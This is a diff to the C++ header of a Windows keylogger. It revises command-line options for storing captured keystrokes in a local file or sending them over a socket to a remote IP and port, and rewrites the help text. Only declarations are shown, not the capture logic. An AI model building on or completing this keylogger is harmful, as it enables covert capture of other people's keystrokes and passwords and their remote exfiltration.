@@ -1,17 +1,10 @@
 #ifndef _MAIN_HPP_
 #define _MAIN_HPP_
 
-#include <winsock2.h>
-#include <iostream>
-#include <Windows.h>
-#include <fstream>
-#include <string.h>
-#include <unistd.h>
-#include <getopt.h>
-#include <string>
-#include <cstring>
-#include <cstddef>
-#include <sstream>
+#include <winsock2.h> //SOCKET, etc
+#include <iostream> //cout
+#include <fstream> //ofstream
+#include <getopt.h> //options
 
 #define DEFAULT_IP_VALUE "127.0.0.1"
 #define DEFAULT_PORT_VALUE 7777
@@ -19,29 +12,36 @@
 #define DEFAULT_FILE_PATH "D:/temp.txt"
 
 #define LONG_OPTION_LOCAL "local"
-#define LONG_OPTION_FILE_PATH "file_path"
 #define LONG_OPTION_REMOTE "remote"
-#define LONG_OPTION_NO_ARROW "no_arrow"
+#define LONG_OPTION_BUFFER_SIZE "buffer_size"
 #define LONG_OPTION_NO_CLICK "no_click"
-#define LONG_OPTION_ASCII_ONLY "ascii_only"
-#define LONG_OPTION_MAXIMUM_BUFFER_SIZE "maximum_buffer_size"
+#define LONG_OPTION_ALPHABET_ONLY "alphabet_only"
+#define LONG_OPTION_STORE_CHARACTER "store_character"
 #define LONG_OPTION_HELP "help"
 
 #define SHORT_OPTION_LOCAL 'l'
 #define SHORT_OPTION_REMOTE 'r'
-#define SHORT_OPTION_NO_ARROW 'a'
+#define SHORT_OPTION_BUFFER_SIZE 'b'
 #define SHORT_OPTION_NO_CLICK 'c'
-#define SHORT_OPTION_ASCII_ONLY 'A'
-#define SHORT_OPTION_MAXIMUM_BUFFER_SIZE 'm'
+#define SHORT_OPTION_ALPHABET_ONLY 'A'
+#define SHORT_OPTION_STORE_CHARACTER 'C'
 #define SHORT_OPTION_HELP 'h'
 
 #define HELP_MESSAGE "Keylogger options : "
-#define HELP_MESSAGE_LOCAL "\t-l | --local : local keylogger, store data into file on this computer, require 1 argument (destination path)"
-#define HELP_MESSAGE_LOCAL_EXAMPLE "\t\tExample : ./bin/main.exe -l D:\\file.txt"
-#define HELP_MESSAGE_REMOTE "\t-r | --remote : remote keylogger, send data via socket, require 2 arguments (ip, port)"
-#define HELP_MESSAGE_REMOTE_EXAMPLE "\t\tExample : ./bin/main.exe -r 192.168.1.16 7777"
-#define HELP_MESSAGE_HELP "\t-h | --help : print this help"
-#define HELP_MESSAGE_HELP_EXAMPLE "\t\tExample : ./bin/main.exe -h"
+#define HELP_MESSAGE_REQUIERED "\t[REQUIERED] : Please, choose one of this option"
+#define HELP_MESSAGE_LOCAL "\t\t-l | --local : local keylogger, store data into file on this computer, require 1 argument (destination path)"
+#define HELP_MESSAGE_LOCAL_EXAMPLE "\t\t\tExample : ./bin/main.exe -l D:\\file.txt"
+#define HELP_MESSAGE_REMOTE "\t\t-r | --remote : remote keylogger, send data via socket, require 2 arguments (ip, port)"
+#define HELP_MESSAGE_REMOTE_EXAMPLE "\t\t\tExample : ./bin/main.exe -r 192.168.1.16 7777"
+#define HELP_MESSAGE_OPTIONAL "\t[OPTIONAL]"
+#define HELP_MESSAGE_NO_CLICK "\t\t-c | --no_click : don't store click keys (based on ascii)"
+#define HELP_MESSAGE_NO_CLICK_EXAMPLE "\t\t\tExample : ./bin/main.exe ... -c"
+#define HELP_MESSAGE_ALPHABET_ONLY "\t\t-a | --alphabet_only : Store alphabet only, A-z (based on ascii)"
+#define HELP_MESSAGE_ALPHABET_ONLY_EXAMPLE "\t\t\tExample : ./bin/main.exe ... -a"
+#define HELP_MESSAGE_STORE_CHARACTER "\t\t-C | --store_character : Default store is int value, use this option if you want to store with character"
+#define HELP_MESSAGE_STORE_CHARACTER_EXAMPLE "\t\t\tExample : ./bin/main.exe ... -C"
+#define HELP_MESSAGE_HELP "\t\t-h | --help : print this help"
+#define HELP_MESSAGE_HELP_EXAMPLE "\t\t\tExample : ./bin/main.exe -h"
 
 #define ERROR_MESSAGE_SETCONTROLECTRLHANDLER "error SetConsoleCtrlHandler "
 
@@ -53,8 +53,15 @@
 
 extern string* g_file_path;
 
-extern string* g_ip;
-extern int g_port;
+extern bool g_no_arrow;
+
+extern bool g_no_click;
+
+extern bool g_alphabet_only;
+
+extern bool store_character;
+
+extern size_t g_buffer_size;
 
 extern keylogger* g_keylogger;
 
@@ -68,6 +75,9 @@ void print_help();
 */
 void initialize_options(int, char**);
 
+/*
+* Main function
+*/
 int main(int, char**);
 
 #endif
